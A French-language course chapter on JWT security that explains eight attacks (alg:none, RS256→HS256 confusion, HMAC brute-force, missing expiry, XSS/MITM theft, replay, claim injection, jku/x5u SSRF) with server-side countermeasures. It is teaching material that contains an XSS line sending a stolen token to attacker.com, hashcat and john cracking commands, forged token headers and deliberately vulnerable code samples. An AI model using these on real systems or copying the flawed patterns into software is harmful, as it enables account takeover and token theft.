# Étape 4 — Sécurité JWT : Attaques et Contre-mesures

> **Objectif** : Comprendre en profondeur les vulnérabilités connues des JSON Web Tokens, leurs mécanismes d'exploitation, et les bonnes pratiques de défense à implémenter côté serveur.

---

## Sommaire

1. [Attaque "algorithm confusion" (`alg: none`)](#41-attaque-algorithm-confusion-alg-none)
2. [Confusion RS256 → HS256](#42-confusion-rs256--hs256)
3. [Brute-force sur secret HMAC](#43-brute-force-sur-secret-hmac)
4. [JWT sans expiration (`exp` absent)](#44-jwt-sans-expiration-exp-absent)
5. [Vol de token (XSS, MITM)](#45-vol-de-token-xss-mitm)
6. [Replay Attack](#46-replay-attack)
7. [Injection dans les claims](#47-injection-dans-les-claims)
8. [SSRF via `jku` / `x5u`](#48-ssrf-via-jku--x5u)

---

## 4.1 Attaque "Algorithm Confusion" (`alg: none`)

### Description de la vulnérabilité

Le format JWT permet de spécifier l'algorithme de signature dans le **header** du token :

```json
{
  "alg": "none",
  "typ": "JWT"
}
```

Historiquement, certaines bibliothèques acceptaient `alg: none` comme valeur valide, ce qui signifie **aucune signature requise**. Un attaquant peut alors :

1. Décoder un token JWT valide (le payload est en Base64URL, pas chiffré)
2. Modifier les claims à sa guise (ex. : `"role": "admin"`)
3. Re-encoder le header avec `alg: none`
4. Supprimer la signature (ou laisser une chaîne vide)
5. Soumettre ce token forgé au serveur

```
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0   <- header: alg=none
.eyJ1c2VyX2lkIjoxMjMsInJvbGUiOiJhZG1pbiJ9  <- payload modifié
.                                              <- signature vide !
```

### Pourquoi ça fonctionnait ?

Certaines implémentations naïves faisaient :

```python
# DANGEREUX — ne jamais faire ça
algorithm = jwt.decode_header(token)["alg"]
jwt.decode(token, key, algorithms=[algorithm])  # l'attaquant contrôle algorithm !
```

Le serveur utilisait l'algorithme **déclaré par le client** pour valider le token, ce qui est une erreur fondamentale.

### Contre-mesures

**1. Whitelister explicitement les algorithmes côté serveur**

```python
# ✅ CORRECT — PyJWT
import jwt

ALLOWED_ALGORITHMS = ["HS256"]  # liste figée, jamais lue depuis le token

payload = jwt.decode(
    token,
    SECRET_KEY,
    algorithms=ALLOWED_ALGORITHMS  # whitelist stricte
)
```

```javascript
// ✅ CORRECT — jsonwebtoken (Node.js)
const jwt = require('jsonwebtoken');

jwt.verify(token, SECRET_KEY, { algorithms: ['HS256'] }, (err, payload) => {
    // ...
});
```

**2. Rejeter explicitement `alg: none`**

```python
header = jwt.get_unverified_header(token)
if header.get("alg", "").lower() == "none":
    raise ValueError("Algorithme 'none' interdit")
```

**3. Utiliser des bibliothèques à jour**

La CVE originale (2015) a été patchée dans la quasi-totalité des bibliothèques modernes. Maintenir ses dépendances à jour est non-négociable.

> ⚠️ **Règle d'or** : L'algorithme de vérification est toujours décidé par le **serveur**, jamais par le **client**.

---

## 4.2 Confusion RS256 → HS256

### Description de la vulnérabilité

Cette attaque plus subtile exploite la confusion entre deux familles d'algorithmes :

| Algorithme | Type | Clé de signature | Clé de vérification |
|------------|------|-----------------|---------------------|
| **RS256** | Asymétrique | Clé privée RSA (secrète) | Clé publique RSA (publique) |
| **HS256** | Symétrique | Secret partagé | Même secret partagé |

**Le scénario d'attaque :**

1. Le serveur utilise RS256 — la clé publique RSA est connue de tous (c'est son but)
2. L'attaquant forge un token avec `alg: HS256` dans le header
3. Il signe ce token avec la **clé publique RSA** comme si c'était un secret HMAC
4. Le serveur vulnérable lit `alg: HS256` depuis le token et tente de vérifier avec… la clé publique comme secret HMAC
5. La vérification réussit — l'attaquant est authentifié avec un payload falsifié

```python
# Ce que fait le serveur vulnérable :
alg = decode_header(token)["alg"]  # → "HS256" (injecté par l'attaquant)
key = get_public_key()             # clé publique RSA — connue de l'attaquant !
verify(token, key, algorithm=alg)  # vérifie en HMAC avec la clé publique → succès
```

### Contre-mesures

**1. Ne jamais inférer l'algorithme depuis le token**

```python
# ✅ La config serveur est la source de vérité
jwt.decode(token, PUBLIC_KEY, algorithms=["RS256"])  # fixé, pas lu depuis le token
```

**2. Séparer les clés par algorithme**

Si votre application supporte plusieurs algorithmes (ex. RS256 et HS256 pour des clients différents), utilisez des clés distinctes et ne laissez jamais une clé RSA publique être utilisée comme secret HMAC.

**3. Valider la cohérence header/config avant decode**

```python
header = jwt.get_unverified_header(token)
expected_alg = config.JWT_ALGORITHM  # "RS256"

if header["alg"] != expected_alg:
    raise SecurityException(f"Algorithme inattendu : {header['alg']}")
```

> ⚠️ **Règle d'or** : Une clé publique RSA n'est **jamais** un secret. Ne jamais l'utiliser comme clé HMAC.

---

## 4.3 Brute-force sur Secret HMAC

### Description de la vulnérabilité

Avec HS256/HS384/HS512, la sécurité du JWT repose entièrement sur la **robustesse du secret**. Un token JWT est public et portable — n'importe qui peut tenter de retrouver le secret hors-ligne.

**Outil d'attaque typique : `hashcat` ou `john`**

```bash
# Avec hashcat
hashcat -a 0 -m 16500 token.txt wordlist.txt

# Avec john the ripper
john --format=HMAC-SHA256 --wordlist=rockyou.txt token.txt
```

Un secret comme `secret`, `password`, `jwt_secret`, ou même `mysupersecretkey` sera cassé en secondes.

**Pourquoi c'est dangereux :**
- Le token JWT est souvent accessible (localStorage, logs, erreurs réseau)
- La vérification est hors-ligne — aucun rate-limiting possible
- Une fois le secret trouvé, l'attaquant peut forger **n'importe quel token**

### Contre-mesures

**1. Générer des secrets d'au moins 256 bits aléatoires**

```python
import secrets

# ✅ 32 octets = 256 bits de vraie entropie
SECRET_KEY = secrets.token_hex(32)
# Exemple : "a3f8c2d1e9b04f7a2c8d3e1f0b5a9c2d4e6f8a1b3c5d7e9f0a2b4c6d8e0f2a4b"
```

```bash
# Ou via OpenSSL
openssl rand -hex 32
```

**2. Ne jamais utiliser de secret dérivé de données prévisibles**

```python
# ❌ MAUVAIS — dérivé de données connues ou prévisibles
SECRET = "mon_app_" + app_name        # prévisible
SECRET = hashlib.md5(b"password").hexdigest()  # faible et prévisible
SECRET = str(uuid.uuid4())            # UUID n'est pas cryptographiquement fort
```

**3. Rotation régulière des secrets**

- Implémenter un mécanisme de rotation (ex. : nouveau secret tous les 90 jours)
- Maintenir une période de grâce pour les tokens encore valides (double-clé)

**4. Considérer RS256 pour les systèmes critiques**

Avec RS256, la clé privée ne quitte jamais le serveur. Même si un token est capturé, retrouver la clé privée RSA-2048+ est computationnellement infaisable.

> ⚠️ **Règle d'or** : Minimum **256 bits** d'entropie vraie, générés par un **CSPRNG** (Cryptographically Secure Pseudo-Random Number Generator).

---

## 4.4 JWT sans Expiration (`exp` absent)

### Description de la vulnérabilité

Le claim `exp` (expiration time) est **optionnel** selon la spec RFC 7519. Si absent, le token est techniquement valide **pour toujours**.

```json
{
  "sub": "user_123",
  "role": "admin",
  "iat": 1700000000
  // exp absent → token éternel
}
```

**Conséquences :**
- Un token volé reste exploitable indéfiniment
- La révocation est impossible sans blacklist exhaustive
- Les comptes supprimés/désactivés restent "actifs" via leurs tokens

### Contre-mesures

**1. Toujours inclure `exp` à la création**

```python
import jwt
from datetime import datetime, timedelta, timezone

payload = {
    "sub": str(user.id),
    "role": user.role,
    "iat": datetime.now(timezone.utc),
    "exp": datetime.now(timezone.utc) + timedelta(minutes=15),  # courte durée
    "jti": str(uuid.uuid4()),  # identifiant unique du token
}

token = jwt.encode(payload, SECRET_KEY, algorithm="HS256")
```

**2. Toujours valider `exp` à la vérification**

```python
# ✅ PyJWT valide exp automatiquement — mais vérifier que l'option n'est pas désactivée
payload = jwt.decode(
    token,
    SECRET_KEY,
    algorithms=["HS256"],
    options={"verify_exp": True}  # True par défaut, ne jamais mettre False en prod
)
```

**3. Durées recommandées par type de token**

| Type de token | Durée recommandée |
|--------------|-------------------|
| Access token | 5 à 15 minutes |
| Refresh token | 7 à 30 jours |
| Token d'email/reset | 1 heure max |
| Token de session longue | 24 heures max |

**4. Implémenter un pattern refresh token**

```
[Client] → Access Token (15 min) → [API]
[Client] → Refresh Token (7 jours, stocké httpOnly) → [Auth Server] → nouveau Access Token
```

> ⚠️ **Règle d'or** : `exp` est **obligatoire** dans tout système de production. Un token sans expiration est une porte ouverte permanente.

---

## 4.5 Vol de Token (XSS, MITM)

### Description de la vulnérabilité

Le token JWT est une **credential portable** — quiconque le possède peut s'authentifier. Son vol est donc l'attaque la plus directement impactante.

#### 5a. Cross-Site Scripting (XSS)

Si le token est stocké dans `localStorage` ou `sessionStorage`, un script malveillant injecté dans la page peut le lire :

```javascript
// Script XSS injecté dans la page victime
fetch('https://attacker.com/steal?token=' + localStorage.getItem('jwt_token'));
```

`localStorage` est accessible depuis **tout** JavaScript exécuté sur le domaine, y compris les scripts de CDN, les extensions malveillantes, ou les commentaires utilisateurs non sanitisés.

#### 5b. Man-in-the-Middle (MITM)

Sur une connexion HTTP non chiffrée, le token transmis dans les headers peut être intercepté par un acteur sur le réseau (ex. : Wi-Fi public, proxy d'entreprise, ISP malveillant).

### Contre-mesures

**1. Stockage dans un cookie `httpOnly` + `Secure` + `SameSite`**

```python
# Django — exemple de réponse avec cookie sécurisé
response.set_cookie(
    key="access_token",
    value=token,
    httponly=True,    # inaccessible au JavaScript
    secure=True,      # HTTPS uniquement
    samesite="Strict", # ou "Lax" selon le besoin CSRF
    max_age=900,      # 15 minutes
    path="/api/",
)
```

| Attribut | Effet |
|----------|-------|
| `httpOnly` | Bloque l'accès JavaScript → protège contre XSS |
| `Secure` | Transmission HTTPS uniquement → protège contre MITM |
| `SameSite=Strict` | Bloque les requêtes cross-site → protège contre CSRF |

**2. HTTPS strict (HSTS)**

```python
# Django settings
SECURE_HSTS_SECONDS = 31536000         # 1 an
SECURE_HSTS_INCLUDE_SUBDOMAINS = True
SECURE_HSTS_PRELOAD = True
SECURE_SSL_REDIRECT = True
```

**3. Content Security Policy (CSP)**

```http
Content-Security-Policy: 
  default-src 'self';
  script-src 'self' https://cdn-de-confiance.com;
  object-src 'none';
  base-uri 'self';
```

CSP limite l'exécution de scripts non autorisés, réduisant drastiquement la surface XSS.

**4. Sanitisation des inputs**

Tout contenu utilisateur affiché dans le DOM doit être échappé/sanitisé. Pas de `innerHTML` avec des données utilisateur.

> ⚠️ **Règle d'or** : Ne **jamais** stocker un JWT dans `localStorage` pour des données sensibles. Cookie `httpOnly` + HTTPS = seule combinaison acceptable en production.

---

## 4.6 Replay Attack

### Description de la vulnérabilité

Un token valide intercepté peut être **réutilisé** par un attaquant, même si l'utilisateur légitime a "terminé" sa session. La signature JWT est valide, l'expiration n'est pas encore atteinte : le serveur ne peut pas distinguer le vrai utilisateur de l'attaquant.

**Scénario typique :**
1. L'utilisateur se connecte sur un réseau compromis
2. Son token (15 min de validité) est capturé
3. L'attaquant l'utilise dans la même fenêtre de 15 min
4. Le serveur ne détecte rien d'anormal

### Contre-mesures

**1. `jti` (JWT ID) + blacklist de tokens utilisés**

```python
import uuid
import redis

r = redis.Redis()

# À la création du token
payload = {
    "sub": user_id,
    "exp": ...,
    "jti": str(uuid.uuid4()),  # identifiant unique, non-réutilisable
}

# À la vérification
def verify_token(token):
    payload = jwt.decode(token, SECRET_KEY, algorithms=["HS256"])
    jti = payload["jti"]
    
    # Vérifier que ce jti n'a pas déjà été utilisé (ou révoqué)
    if r.get(f"blacklist:{jti}"):
        raise Exception("Token déjà utilisé ou révoqué")
    
    return payload

# À la déconnexion — invalider le token
def logout(token):
    payload = jwt.decode(token, SECRET_KEY, algorithms=["HS256"])
    jti = payload["jti"]
    exp = payload["exp"]
    ttl = exp - int(time.time())  # garder dans la blacklist jusqu'à expiration naturelle
    
    if ttl > 0:
        r.setex(f"blacklist:{jti}", ttl, "revoked")
```

**2. Courte durée de vie des access tokens**

Réduire la fenêtre de vulnérabilité à 5-15 minutes limite considérablement l'exploitabilité d'un token volé.

**3. Binding du token au client (Token Binding)**

Lier le token à des propriétés du client (IP, fingerprint TLS, User-Agent) — approche plus avancée, avec des compromis sur la mobilité des sessions.

**4. One-Time Tokens pour les opérations critiques**

Pour les actions sensibles (virement, changement de mot de passe), émettre un token à usage unique révoqué dès la première utilisation.

> ⚠️ **Règle d'or** : `jti` + blacklist Redis (avec TTL) est la solution standard pour la révocation de tokens JWT.

---

## 4.7 Injection dans les Claims

### Description de la vulnérabilité

Le payload JWT est encodé en Base64URL — il n'est **pas chiffré**. Si une application lit les claims **sans vérifier la signature**, un attaquant peut injecter n'importe quelle valeur.

```python
# ❌ EXTRÊMEMENT DANGEREUX
import base64
import json

# Décoder sans vérification de signature
header, payload, signature = token.split(".")
claims = json.loads(base64.b64decode(payload + "=="))

# L'attaquant a modifié le payload — on lit des données malveillantes
user_id = claims["user_id"]   # peut être n'importe quoi
role = claims["role"]         # "admin" injecté par l'attaquant
```

**Cas réels de ce pattern dangereux :**
- Middleware qui lit les claims pour du logging avant vérification
- Microservices qui se font confiance mutuellement sans re-vérifier
- Debugging code laissé en production

### Contre-mesures

**1. Toujours vérifier la signature avant de lire les claims**

```python
# ✅ La vérification est atomique — decode + verify en une seule opération
try:
    payload = jwt.decode(
        token,
        SECRET_KEY,
        algorithms=["HS256"]
    )
    # Ici seulement, les claims sont fiables
    user_id = payload["sub"]
    role = payload["role"]
except jwt.InvalidTokenError as e:
    raise AuthenticationError("Token invalide")
```

**2. Ne jamais faire confiance à un JWT non vérifié, même "interne"**

Dans une architecture microservices, chaque service doit vérifier le token lui-même, même s'il vient d'un autre service interne. Le principe **Zero Trust** s'applique.

**3. Valider le contenu des claims après décodage**

La vérification de signature garantit l'intégrité, mais pas la cohérence applicative :

```python
payload = jwt.decode(token, SECRET_KEY, algorithms=["HS256"])

# Validation supplémentaire des valeurs
assert payload.get("sub"), "Claim 'sub' manquant"
assert payload.get("role") in VALID_ROLES, "Rôle invalide"
assert isinstance(payload.get("user_id"), int), "user_id doit être un entier"
```

> ⚠️ **Règle d'or** : Les claims JWT ne sont dignes de confiance **qu'après** vérification de signature réussie. Zéro exception.

---

## 4.8 SSRF via `jku` / `x5u`

### Description de la vulnérabilité

La spec JWS (JSON Web Signature) permet plusieurs headers optionnels pour référencer des clés de vérification à distance :

| Header | Description |
|--------|-------------|
| `jku` | URL vers un JSON Web Key Set (JWKS) |
| `x5u` | URL vers un certificat X.509 |
| `jwk` | Clé publique inline dans le header |

Un attaquant peut forger un token avec :

```json
{
  "alg": "RS256",
  "typ": "JWT",
  "jku": "https://attacker.com/malicious-jwks.json"  // serveur contrôlé par l'attaquant
}
```

Si le serveur fait une requête HTTP vers `jku` pour obtenir la clé publique, l'attaquant :
1. Héberge son propre JWKS sur `attacker.com`
2. Le serveur télécharge la clé publique de l'attaquant
3. L'attaquant signe le token avec la clé privée correspondante
4. La vérification réussit — token forgé accepté

**Double danger :** en plus de l'auth bypass, cette attaque constitue une **SSRF** (Server-Side Request Forgery) — le serveur fait des requêtes vers des URLs arbitraires, potentiellement vers des services internes (metadata AWS, Kubernetes API, base de données).

### Contre-mesures

**1. Whitelist stricte des URLs de clés autorisées**

```python
ALLOWED_JKU_DOMAINS = {"auth.mondomaine.com", "keys.mondomaine.com"}

def verify_jwt_with_jku(token):
    header = jwt.get_unverified_header(token)
    
    if "jku" in header:
        from urllib.parse import urlparse
        parsed = urlparse(header["jku"])
        
        if parsed.netloc not in ALLOWED_JKU_DOMAINS:
            raise SecurityException(f"jku non autorisé : {header['jku']}")
        
        if parsed.scheme != "https":
            raise SecurityException("jku doit utiliser HTTPS")
    
    # Continuer la vérification...
```

**2. Ignorer complètement `jku`, `x5u`, et `jwk`**

La solution la plus simple et la plus sûre est de ne jamais utiliser ces headers et de configurer les clés directement côté serveur :

```python
# ✅ Clé publique chargée localement, jamais via jku
with open("public_key.pem", "rb") as f:
    PUBLIC_KEY = f.read()

payload = jwt.decode(token, PUBLIC_KEY, algorithms=["RS256"])
# jku/x5u/jwk dans le header sera ignoré par PyJWT
```

**3. Utiliser des bibliothèques qui gèrent JWKS de manière sécurisée**

Pour les systèmes OAuth2/OIDC qui doivent récupérer des clés dynamiquement (ex. : vérification de tokens Google, Auth0), utiliser des bibliothèques dédiées qui implémentent les protections nécessaires :

```python
# python-jose avec validation d'issuer stricte
from jose import jwt

payload = jwt.decode(
    token,
    key=fetch_jwks_from_trusted_issuer(),  # URL fixe, pas lue depuis le token
    algorithms=["RS256"],
    audience="mon-api",
    issuer="https://auth.mondomaine.com"
)
```

> ⚠️ **Règle d'or** : Ne jamais laisser le client dicter l'URL depuis laquelle le serveur télécharge sa propre clé de vérification. C'est une SSRF garantie.

---

## Récapitulatif des Contre-mesures

| # | Attaque | Contre-mesure principale |
|---|---------|--------------------------|
| 4.1 | `alg: none` | Whitelist d'algorithmes côté serveur, jamais depuis le token |
| 4.2 | Confusion RS256→HS256 | Algorithme fixé en config serveur, clés séparées |
| 4.3 | Brute-force HMAC | Secret ≥ 256 bits aléatoires (CSPRNG), ou passer à RS256 |
| 4.4 | Pas d'`exp` | `exp` obligatoire, access token 5-15 min |
| 4.5 | XSS / MITM | Cookie `httpOnly` + `Secure`, HTTPS/HSTS, CSP stricte |
| 4.6 | Replay | `jti` unique + blacklist Redis avec TTL |
| 4.7 | Injection claims | Vérifier la signature avant toute lecture de claim |
| 4.8 | SSRF via `jku`/`x5u` | Whitelist d'URLs stricte, ou ne jamais utiliser ces headers |

---

## Checklist de Sécurité JWT (Production)

```
✅ Algorithme whitelisté côté serveur (jamais lu depuis le token)
✅ Secret HMAC ≥ 256 bits, généré par CSPRNG
✅ Claim exp toujours présent et validé
✅ Access token ≤ 15 minutes
✅ Token stocké en cookie httpOnly + Secure + SameSite
✅ HTTPS strict avec HSTS
✅ CSP définie et restrictive
✅ jti présent + mécanisme de révocation (logout, blacklist)
✅ Signature vérifiée AVANT lecture des claims
✅ jku/x5u ignorés ou whitelistés strictement
✅ Bibliothèques JWT à jour (CVE monitorées)
✅ Logs d'échec de validation (pour détecter les tentatives d'attaque)
```

### Points de contrôle — vérifiez votre compréhension

1. Un attaquant intercepte un JWT et remplace le header `alg` par `none`. Pourquoi cela peut-il fonctionner sur un serveur vulnérable, et quelle est la **seule** contre-mesure fiable ?
2. Expliquez comment l'attaque par confusion RS256→HS256 fonctionne. Pourquoi la clé publique RSA suffit-elle à l'attaquant pour forger un token valide ?
3. Un secret HMAC de 12 caractères alphanumériques est-il suffisant ? Justifiez avec un ordre de grandeur du temps de brute-force.
4. Quelle est la différence entre **empêcher le vol** d'un token (XSS/MITM) et **limiter l'impact** d'un token volé (replay) ? Citez une contre-mesure pour chaque cas.
5. Pourquoi faut-il vérifier la signature d'un JWT **avant** de lire ses claims ? Quel type d'attaque cela prévient-il ?
6. Comment le claim `jti` combiné à une blacklist Redis avec TTL permet-il de contrer les replay attacks sans transformer le JWT en token stateful permanent ?
7. Un serveur accepte le header `jku` pour résoudre dynamiquement les clés publiques. Décrivez le scénario d'attaque SSRF et la contre-mesure appropriée.

---

*Cours rédigé dans le cadre d'une série sur les JSON Web Tokens — Étape 4 sur 8.*






